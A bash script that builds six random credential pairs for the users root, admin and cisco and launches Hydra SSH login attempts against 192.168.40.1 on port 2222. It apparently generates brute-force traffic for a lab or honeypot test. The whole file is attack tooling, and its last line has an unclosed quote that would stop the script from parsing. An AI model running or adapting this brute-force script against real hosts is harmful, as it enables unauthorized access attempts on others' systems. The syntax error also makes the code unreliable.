#!/bin/bash
TARGET_IP="192.168.40.1"
PORT="2222"
CREDS_FILE="random_pairs.txt"

# 1. Clear any old credentials file if it exists
> "$CREDS_FILE"

# 2. Define the allowed usernames
USERS=("root" "admin" "cisco")

echo "[*] Generating 6 random user:pass combinations..."

# 3. Generate exactly 6 random pairs
for i in {1..6}
do
    # Randomly select a user from the array
    RAND_USER=${USERS[$RANDOM % ${#USERS[@]}]}

    # Generate a random 8-character password
    RAND_PASS=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)

    # Save the pair to the list
    echo "$RAND_USER:$RAND_PASS" >> "$CREDS_FILE"
    echo "  Attempt $i: Selected User '$RAND_USER' with random password"
done

echo "[*] Launching Hydra against port $PORT..."

# 4. Run Hydra using the colon-separated pairs list
hydra -C "$CREDS_FILE" -s "$PORT" ssh://"$TARGET_IP" -t 1

# 5. Clean up the temporary file
rm "$CREDS_FILE
